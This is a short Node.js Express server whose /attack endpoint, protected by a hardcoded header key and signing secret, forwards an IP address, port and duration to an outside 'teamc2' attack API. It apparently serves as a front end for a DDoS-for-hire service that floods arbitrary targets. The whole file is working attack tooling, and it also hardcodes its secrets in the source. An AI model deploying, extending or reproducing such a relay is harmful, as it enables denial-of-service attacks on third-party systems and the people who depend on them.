const express = require("express");
const axios = require("axios");
const cors = require("cors");
const crypto = require("crypto");

const app = express();

app.use(cors());
app.use(express.json());

// ENV
const API_KEY = process.env.API_KEY;
const PORT = process.env.PORT || 8080;

console.log("API_KEY:", API_KEY ? "Loaded ✅" : "Missing ❌");
console.log("Binding PORT:", PORT);

// ================= 🔐 SECURITY =================

const SECRET = "SECRET123";

function sha256(data) {
  return crypto.createHash("sha256").update(data).digest("hex");
}

// ================= ROUTES =================

// ⚡ Fast health routes (important for deploy)
app.get("/", (req, res) => res.status(200).send("OK"));
app.get("/health", (req, res) => res.status(200).send("OK"));

app.post("/attack", async (req, res) => {
  try {
    if (req.headers["x-sec"] !== "9xK3pL") {
      return res.status(403).json({ error: "Forbidden" });
    }

    let { ip, port, time } = req.body;

    if (!ip || !port || !time) {
      return res.status(400).json({ error: "Missing params" });
    }

    port = Number(port);
    time = Number(time);

    if (isNaN(port) || isNaN(time)) {
      return res.status(400).json({ error: "Invalid port/time" });
    }

    const expected = sha256(ip + port + time + SECRET);

    if (req.headers["x-sign"] !== expected) {
      return res.status(403).json({ error: "Invalid sign" });
    }

    if (!API_KEY) {
      return res.status(500).json({ error: "API key missing" });
    }

    const url = `https://app.teamc2.xyz/api/attack?api_key=${API_KEY}&target=${ip}&port=${port}&time=${time}&concurrent=1`;

    const response = await axios.get(url, { timeout: 10000 }); // ⬅️ reduced timeout

    return res.json({
      success: true,
      data: response.data,
    });

  } catch (err) {
    console.error("ERROR:", err?.response?.data || err.message);

    return res.status(500).json({
      error: err?.response?.data || "Server error",
    });
  }
});

// ================= START =================

// ❌ "0.0.0.0" remove (not needed)
const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
